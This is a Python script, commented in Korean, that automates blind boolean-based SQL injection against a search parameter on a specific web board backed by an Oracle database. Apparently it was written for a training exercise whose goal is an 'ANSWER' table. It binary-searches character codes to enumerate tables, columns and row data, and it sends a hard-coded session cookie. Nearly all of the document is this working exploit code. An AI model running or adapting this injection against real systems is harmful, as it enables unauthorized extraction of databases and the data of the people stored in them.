# 테이블 개수 : 6
# 테이블 문자열 길이 [5, 9, 13, 6, 7, 6]


# 1. 인젝션 공격 포인트 

# 2. 테이블 명 union select table_name, null, null from 
#    테이블 정보 함수(select table_name from 테이블정보 한줄씩) 
#    ascii(substr(select table_name from 테이블 정보 한줄씩), 
#    한글자씩, 1) # 
# 2-1. 테이블의 개수 # 
# 2-2. 한 줄 씩 테이블명 -> 한글자씩 # 
# 2-2.1. 테이블명 글자수 # 
# 2-2.2. 1~글자수까지 한개씩 # 
# 
# 3. 위에서 구한 테이블 s 1개의 컬럼명 # 
# 3-1. 해당 테이블의 컬럼 수 # 
# 3-2. 컬럼을 한줄씩 1글자씩 # 
# 3-2.1 컬럼명 글자수 # 3-2.2 컬럼명 1~글자수까지 한개씩 
# 
# # 4. 테이블명, 컬럼명을 가지고 데이터 추출 
# # 4-1. 데이터의 개수 # 4-2. 한줄씩 데이터 한글자씩 
# # 4-2.1 데이터 문자열 길이 
# # 4-2.2 데이터 문자를 한글자씩

import requests

url = 'http://elms1.skinfosec.co.kr:8082/community6/free'
param = {"searchType" : "all", "keyword" : "yahoo"}
jsession = {'JSESSIONID':'E81B282480BF2E8CB3A5FB09DD77ED29'}
contype = {'Content-Type':'application/x-www-form-urlencoded'}

keyword = "yahoo%' and {} and '1%'='1"

# 이진탐색
def binary_search(query, keyword):
    min = 1
    max = 127
    query += " > {}"
    while min != max :
        avg = int( ( min + max ) / 2 )
        query_modify = query.format(avg)
        param['keyword'] = keyword.format(query_modify)
        res = requests.post(url, data=param, cookies=jsession, headers=contype)
        
        if 'REIZEI' in res.text :
            min = avg + 1
        else:
            max = avg
    return min

# 테이블 개수
def count_table():
    query = "(select count(table_name) from user_tables)"
    result = binary_search(query, keyword)
    print(f'테이블 수 : {str(result)}')
    return result

# 테이블명, 길이
def table_name(table_count):
    query = '(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum={})'
    for i in range(1, table_count + 1):
        query_modify = query.format(i)
        length_table = binary_search(query_modify, keyword)
        
        print(f'{i}번째 테이블의 문자열 길이 : {length_table}')
        result_table_name = ""
        
        for j in range(1, length_table + 1):
            name_query = '(select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {})'
            name_query_modify = name_query.format(j, i)
            find_table_name = binary_search(name_query_modify, keyword)
            
            result_table_name += chr(find_table_name)
    
        print(f'{i}번째 테이블명 : {result_table_name}')
        table_name_list.append(result_table_name)
    return 

# 컬럼 개수
def count_table_columns(table_name):
    query = "(select count(column_name) from all_tab_columns where table_name = '{}')"
    query_modify = query.format(table_name)
    column_count = binary_search(query_modify, keyword)
    
    print(f'컬럼 개수 : {column_count}')
    return column_count

# 컬럼명, 길이
def table_columns_name(table_name, column_count):
    query = "(select length(column_name) from all_tab_columns where table_name = '{}' and column_id = '{}')"
    for i in range(1, column_count + 1):
        query_modify = query.format(table_name, i)
        length_column = binary_search(query_modify, keyword)
        
        print(f'{i}번째 컬럼의 길이 : {length_column}')
        result_column_name = ''
        
        for j in range(1, length_column + 1):
            name_query = "(select ascii(substr(column_name, {}, 1)) from (select column_name, rownum as rnum from user_tab_columns where table_name = '{}') where rnum = {})"
            name_query_modify = name_query.format(j, table_name, i)
            find_column_name = binary_search(name_query_modify, keyword)
            
            result_column_name += chr(find_column_name)
        
        print(f'{i}번째 컬럼명 : {result_column_name}')
        column_name_list.append(result_column_name)
    return

def count_data(table_name, column_name):
    #(Select ascii(substring((select column_name from name_of_the_table limit 0,1),1,1))=97) –
    column_list = column_name
    query = "(select count(column_name) from all_tab_columns where table_name = '{}' and column_name = '{}')"
    for i in range(0, len(column_list)):
        query_modify = query.format(table_name, column_list[i])
        count_data = binary_search(query_modify, keyword)
        print(f'{i+1}번째 컬럼 데이터 개수 : {count_data}')
        data_count_list.append(count_data)
    return 

def extract_data(table_name, column_name, data_count):
    column_name_list = column_name
    data_count_list = data_count

    # 괄호나, from에는 '' 사용하지 않는다.
    query = "(select length({}) from {} where rownum = {})"

    for i in range(0, len(column_name_list)):
        for j in range(0, data_count_list[i]):
           query_modify = query.format(column_name_list[i], table_name, j+1)
           length_data = binary_search(query_modify, keyword)
           
           if(column_name_list[i] == 'ANSWER'):
            print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 길이 : {length_data}')

           result_data_name = ''

           for k in range(1, length_data+1):
                data_query = "(select ascii(substr({}, {}, 1)) from {} where rownum = {})"
                data_query_modify = data_query.format(column_name_list[i], k, table_name, j+1)
                find_data_name = binary_search(data_query_modify, keyword)

                result_data_name += chr(find_data_name)
        if(column_name_list[i] == 'ANSWER'):
            print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 이름 : {result_data_name}')
            break

    return

######### MAIN ###################

# --- table ---
# table 개수 확인
count_table = count_table()
# table name을 list 저장
table_name_list = []
table_name = table_name(count_table)


# --- column ---
# table name == ANSWER 이면, ANSWER table의 column 개수 확인
column_count = None
for item in table_name_list:
    if item == 'ANSWER':
        column_count = count_table_columns(item)
        table_name = item
        # column_list = [ANSWER, RED_DT, REG_ACCT_ID, UDT_DT, UDT_ACCT_ID]
        # table = 'ANSWER'
        # count = [1, 1, 1, 1, 1]
        
# column name list 저장
column_name_list = []
column_name = table_columns_name(table_name, column_count)


# --- data ---
# data 개수 확인
data_count_list = []
data_count = count_data(table_name, column_name_list)

# column_name == 'ANSWER' 이면, 데이터 길이, 이름 출력
data_extract = extract_data(table_name, column_name_list, data_count_list)
# data_length = [4, 1, 13, 9, 13]

# table_name = 'ANSWER'
# column_name_list = ['ANSWER', 'RED_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']